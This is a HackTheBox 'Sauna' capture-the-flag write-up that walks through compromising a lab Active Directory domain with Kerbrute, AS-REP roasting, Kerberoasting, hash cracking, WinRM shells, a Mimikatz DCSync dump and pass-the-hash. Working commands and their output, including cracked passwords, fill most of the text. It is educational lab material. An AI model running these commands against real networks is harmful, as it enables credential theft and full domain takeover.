# HackTheBox — Sauna

**Difficulty:** Easy  
**OS:** Windows (Active Directory)  
**IP:** 10.129.18.62  

---

## Attack Path Summary

```
Collect usernames from website → generate username formats with username-anarchy →
AS-REP Roasting with Kerbrute → crack hash with hashcat →
WinRM shell as fsmith → find AutoLogon credentials with WinPEAS →
WinRM shell as svc_loanmgr → DCSync attack → Administrator NTLM hash → root
```

---

## 1. Recon — Port Scanning

The first step is always a port scan. We can't do anything useful without knowing which services are running on the target.

```bash
rustscan -a 10.129.18.62
```

Open ports:

| Port  | Service             | Note                         |
|-------|---------------------|------------------------------|
| 53    | DNS                 | Domain name resolution        |
| 80    | HTTP                | Web server                   |
| 88    | Kerberos            | **Strong DC indicator**       |
| 135   | MSRPC               | Windows RPC                  |
| 139   | NetBIOS             | SMB helper                   |
| 389   | LDAP                | Active Directory              |
| 445   | SMB                 | File sharing                 |
| 464   | Kpasswd             | Kerberos password change      |
| 636   | LDAPS               | Encrypted LDAP               |
| 3268  | Global Catalog LDAP | Forest-wide AD queries        |
| 5985  | WinRM               | Remote PowerShell             |
| 9389  | ADWS                | AD Web Services              |

Next, we ran nmap against the key ports to grab version info:

```bash
nmap -sV -sC -p 80,88,389,445,5985 10.129.18.62
```

This gave us something very important from LDAP:

```
389/tcp  open  ldap  Microsoft Windows Active Directory LDAP
        (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
```

**Why do these ports matter?**

Port **88 (Kerberos)** almost always means you are looking at a Domain Controller. Regular machines in a domain don't run Kerberos. When you see 88 + 389 + 53 + 464 all open on the same machine, that combination is a very strong sign that the machine is the DC. A single open port like 53 means nothing on its own, but this combination is very telling.

Port **5985 (WinRM)** is also important — if we get credentials later, we can use `evil-winrm` to get a remote shell through this port.

We also got the domain name from LDAP: `EGOTISTICAL-BANK.LOCAL`. We added it to `/etc/hosts` so the machine name can be resolved:

```bash
echo "10.129.18.62 EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration — Username Harvesting

Port 80 had a bank website. On the **Our Team** page, we found real employee names:

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

**Why does this matter?** In Active Directory, usernames are almost always created from real names. If we have a list of names from a company, we can turn them into likely username formats (`fsmith`, `fergus.smith`, `f.smith`, etc.) and check which ones actually exist in the domain. This is a very common technique in real penetration tests too — attackers use LinkedIn the same way.

---

## 3. Username Enumeration — Kerbrute + AS-REP Roasting

### Generating a username list

We saved the names to a file, then used `username-anarchy` to generate all likely formats:

```bash
ruby username-anarchy -i ~/Downloads/names > ~/Downloads/usernames.txt
```

This tool creates dozens of formats for each name: `fsmith`, `fergus.smith`, `ferguss`, `smithf`, and so on — 88 usernames in total.

### Checking usernames with Kerbrute

```bash
kerbrute userenum --dc 10.129.18.62 -d EGOTISTICAL-BANK.LOCAL usernames.txt
```

**What is Kerbrute?** It uses Kerberos `AS-REQ` packets to check whether a username exists in the domain. If the user doesn't exist, the DC replies with `KDC_ERR_C_PRINCIPAL_UNKNOWN`. What makes this different from a normal brute force is that it does not try passwords at all — it only checks if the username is valid.

Result:

```
[+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:...
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
```

Two things happened here:
1. `fsmith` exists in the domain
2. **Kerberos Pre-Authentication is disabled** for `fsmith` — this means AS-REP Roasting is possible

**What is AS-REP Roasting?** In normal Kerberos, when a user wants to get a TGT (ticket to prove their identity), they first have to prove they know their password. This is called pre-authentication. However, this step can be turned off for some accounts. When it is off, we can ask the DC for an encrypted TGT response (AS-REP) for that user without knowing the password — and then we can try to crack that encrypted response offline to find the plaintext password.

### Cracking the hash

The hash Kerbrute dumped started with `$krb5asrep$18$` — this is **etype 18 (AES-256)**. We needed to get an etype 23 (RC4) hash instead, because that format is much faster to crack. We used `impacket-GetNPUsers` to request it:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.18.62 -usersfile usernames.txt -format hashcat
```

**Kerberos Clock Skew issue:** Kerberos is very strict about time. If the time difference between your machine and the DC is more than 5 minutes, every Kerberos operation will fail with `KRB_AP_ERR_SKEW`. The fix:

```bash
sudo timedatectl set-ntp false   # Stop automatic NTP sync
sudo ntpdate 10.129.18.62        # Sync time with the DC
```

The reason we need `set-ntp false` first is that without it, the system would immediately re-sync with its own NTP server and undo our change.

Now we cracked the hash with hashcat:

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

`-m 18200` is the hashcat mode for AS-REP hashes. Result:

```
fsmith : Thestrokes23
```

---

## 4. Kerberoasting — HSmith

While we had the `fsmith` credentials, we checked for any **Kerberoastable** accounts in the domain. A Kerberoastable account is any account that has a Service Principal Name (SPN) set. SPNs are identifiers that link a service to a specific account — for example, a web service might run under a domain account that has an SPN. The reason this matters for attackers is that any authenticated domain user can request a TGS ticket for any SPN, and that ticket is encrypted with the service account's password hash. We can take that ticket offline and try to crack it.

```bash
impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip 10.129.18.62 -request
```

Result:

```
ServicePrincipalName                      Name    PasswordLastSet
----------------------------------------  ------  --------------------------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith  2020-01-23 09:54:34
```

`HSmith` had an SPN set, so we got a TGS hash back. We saved it and cracked it with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=krb5tgs
```

Result:

```
Thestrokes23  (HSmith)
```

The password cracked quickly, but it turned out to be the **same password as fsmith**. We tested `HSmith:Thestrokes23` against SMB to see if this account had access to anything new:

```bash
netexec smb 10.129.18.62 -u HSmith -p Thestrokes23 --shares
```

HSmith could read some shares but there was nothing useful inside them. This account did not give us a new path forward. However, the Kerberoasting technique itself worked perfectly — we got a valid hash and cracked it. In many real engagements and CTFs, service accounts like this have unique passwords and lead directly to privilege escalation.

---

## 5. Initial Access — Shell as fsmith

With the credentials in hand, we connected through WinRM:

```bash
evil-winrm -i 10.129.18.62 -u fsmith -p Thestrokes23
```

**What is WinRM?** Windows Remote Management lets you run PowerShell commands on a remote machine. If port 5985 is open and the user is in the `Remote Management Users` group, you can get a shell this way.

We checked our privileges with `whoami /priv`:

```
SeMachineAccountPrivilege
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

`SeDebugPrivilege` was not there — which meant Mimikatz could not access LSASS memory as this user. We needed to find a way to move to a higher-privilege account.

---

## 6. Finding Credentials — WinPEAS AutoLogon

We uploaded `winpeas.exe` and ran it. WinPEAS is a tool that checks a Windows machine for common privilege escalation paths — it looks at registry entries, running services, scheduled tasks, stored credentials, and more.

In the **AutoLogon Credentials** section, WinPEAS found something very useful:

```
DefaultDomainName  :  EGOTISTICALBANK
DefaultUserName    :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword    :  Moneymakestheworldgoround!
```

**What is AutoLogon?** Windows allows a user to log in automatically when the machine boots, without anyone typing a password. To do this, the password is stored in the registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. This is sometimes used for servers in locked rooms that need to restart without anyone present. The problem is that the password is stored in plaintext, which makes it easy to steal.

---

## 7. Lateral Movement — Shell as svc_loanmgr

We confirmed the credentials work and got a new shell:

```bash
netexec winrm 10.129.18.62 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
# [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)

evil-winrm -i 10.129.18.62 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

`svc_loanmgr` is a **service account** — accounts created to run services or automated tasks rather than for a real person. In Active Directory, service accounts often have special permissions. Using BloodHound, we confirmed that `svc_loanmgr` has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions, which means a **DCSync attack** is possible.

---

## 8. Domain Compromise — DCSync Attack

**What is DCSync?** Domain Controllers use a protocol called `MS-DRSR` to share Active Directory data with each other (replication). Any account that has `DS-Replication-Get-Changes-All` permission can pretend to be a DC and ask the real DC to send it a user's password hash. This is called DCSync. The key point is that this is a network-based attack — we never touch the memory of the machine directly.

We ran Mimikatz from the `svc_loanmgr` session:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator" "exit"
```

Result:

```
SAM Username  : Administrator
Hash NTLM     : 823452073d75b9d1cf70ebdf86c7f98e
```

**Note:** We did not need `privilege::debug` here. That command is needed when Mimikatz has to read local LSASS memory. DCSync does not touch local memory at all — it talks directly to the DC over the network, so no debug privilege is needed.

---

## 9. Root — Pass-the-Hash

We used the NTLM hash directly without cracking it (**Pass-the-Hash**):

```bash
evil-winrm -i 10.129.18.62 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**What is Pass-the-Hash?** In Windows NTLM authentication, the system never actually sends or checks the plaintext password — it only uses the hash. This means that if you have someone's NTLM hash, you can log in as them without ever knowing their actual password. The hash is the key.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b99d8ab06092dfd12eb84801e9e46e7f
```

---

## Key Takeaways

**1. Port combinations tell you if a machine is a DC.**
When ports 88, 389, 53, and 464 are all open together, the machine is almost certainly a Domain Controller. Port 88 (Kerberos) is the strongest indicator — regular machines in a domain do not run Kerberos.

**2. The company website can give you a username list.**
The "Our Team" page had real employee names. Combined with `username-anarchy`, this gave us a full wordlist of possible usernames to test. In real engagements, LinkedIn works the same way.

**3. AS-REP Roasting requires no credentials at all.**
If a user account has pre-authentication disabled, you can get a crackable hash just by knowing their username. Kerbrute finds these accounts during user enumeration.

**4. Kerberos is very strict about time.**
A clock difference of more than 5 minutes between your machine and the DC will cause all Kerberos operations to fail. Always sync time with `sudo timedatectl set-ntp false` followed by `sudo ntpdate <DC_IP>` before doing any Kerberos work.

**5. AutoLogon credentials are a major security risk.**
Windows stores AutoLogon passwords in plaintext in the registry. WinPEAS finds these automatically. In real environments, this is a serious configuration mistake.

**6. Service accounts often have dangerous permissions.**
When you see an account starting with `svc_`, check its permissions in BloodHound. Service accounts are very commonly the path to DCSync in CTFs and real engagements.

**7. DCSync does not need high local privileges.**
`privilege::debug` is only needed when Mimikatz reads local memory. DCSync is a network call to the DC's replication API, so it works with just the right AD permissions — no local admin needed.

---

## Note on Failed Attempts

- **SMB anonymous enumeration** — No shares were listed. SMB was not the attack path on this machine.
- **Mimikatz `sekurlsa::logonpasswords` as fsmith** — Access was denied because `SeDebugPrivilege` was missing. This technique only works with a highly privileged account.
- **Cracking the etype 18 hash with hashcat** — The hash Kerbrute dumped (`$krb5asrep$18$`) is AES-256. Hashcat's `-m 18200` mode is for etype 23 (RC4), not AES-256. The fix was to get a fresh hash using `impacket-GetNPUsers`, which requests the weaker RC4 format.
- **File transfer via SMB share** — The target machine's firewall blocked outbound connections. The fix was to use Evil-WinRM's built-in `download` command, which works over the existing WinRM connection.
- **Kerberoasting HSmith** — Failed at first with `KRB_AP_ERR_SKEW` because the clock was not synced. After fixing the time, the TGS hash was retrieved, but this was not the intended path to root.
